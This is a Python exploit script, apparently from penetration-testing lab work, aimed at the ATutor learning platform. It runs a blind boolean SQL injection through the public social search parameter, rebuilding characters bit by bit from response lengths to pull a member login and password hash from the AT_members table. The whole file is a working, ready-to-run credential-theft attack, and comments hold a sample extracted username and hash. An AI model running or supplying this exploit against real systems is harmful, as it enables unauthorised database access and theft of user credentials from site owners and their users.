import sys, re, os
import requests
import hashlib
from bs4 import BeautifulSoup
import zipfile
from io import BytesIO

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])

    if content_length == 20:
        return False 
    else:
        return True

def extract_data(ip, inj):
    # template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
    print(f"Extracting data with inj string: {inj}......")

    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character_value = 0
        for c in range(7): # Use bitwise AND operator to identify characters in blind SQLi
            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))%26{2**c}%23"
            res = searchFriends_sqli(ip, query_string)
            if res: # the c-th bit is ON
                new_character_value += (2**c)
        if new_character_value == 0:
            print("No possible characters, breaking now!")
            break
        else:
            output += chr(new_character_value)
            print(f"Success, adding {chr(new_character_value)} -- {output}")
            
    print(f"Extracted data: {output}")
    return output

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
    username = extract_data(ip, username_injection_string)
    # username = "teacher"

    password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    hash = extract_data(ip, password_injection_string)
    # hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    print(f"Extracted Credentials: {username}, {hash}")

if __name__ == "__main__":
    main()